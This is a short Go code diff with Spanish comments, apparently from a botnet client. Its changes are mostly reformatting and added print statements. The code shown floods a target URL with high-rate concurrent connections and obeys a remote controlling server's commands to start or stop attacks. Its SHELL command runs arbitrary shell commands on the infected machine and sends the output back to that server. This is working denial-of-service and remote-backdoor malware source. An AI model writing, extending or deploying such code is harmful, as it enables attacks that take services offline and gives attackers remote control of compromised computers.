@@ -45,7 +45,7 @@ func StressConnections(ctx context.Context, url string, concurrency int) {
 	worker := func() {
 		defer wg.Done()
 
-		ticker := time.NewTicker(2 * time.Millisecond) // esto hace agresividad
+		ticker := time.NewTicker(2 * time.Millisecond) // agresividad aqui
 		defer ticker.Stop()
 
 		for {
@@ -119,8 +119,10 @@ func main() {
 			// 	aqui van las ordenes que se pueden recibir de la centralita
 			switch msg["action"] {
 			case "START":
-				if cancelFunc != nil { cancelFunc() }
-
+				if cancelFunc != nil {
+					cancelFunc()
+				}
+				fmt.Println("atacando ", msg["payload"])
 				ctx, cancel := context.WithCancel(context.Background())
 				cancelFunc = cancel
 
@@ -130,6 +132,7 @@ func main() {
 				if cancelFunc != nil {
 					cancelFunc()
 					cancelFunc = nil
+					fmt.Println("se para")
 				}
 
 			case "SHELL":
@@ -137,15 +140,19 @@ func main() {
 				fmt.Printf("ejecutando: %s\n", command)
 
 				output, err := executeShellCommand(command)
-				if err != nil { output = fmt.Sprintf("error: %v", err) }
+				if err != nil {
+					output = fmt.Sprintf("error: %v", err)
+				}
 
 				// enviamos la respuesta, realmente no es un shell
 				response := map[string]string{
-					"action": "SHELL_RESULT",
+					"action":  "SHELL_RESULT",
 					"payload": output,
 				}
 
-				if err := conn.WriteJSON(response); err != nil { fmt.Println("error de envío:", err) }
+				if err := conn.WriteJSON(response); err != nil {
+					fmt.Println("error de envío:", err)
+				}
 
 			}
 		}
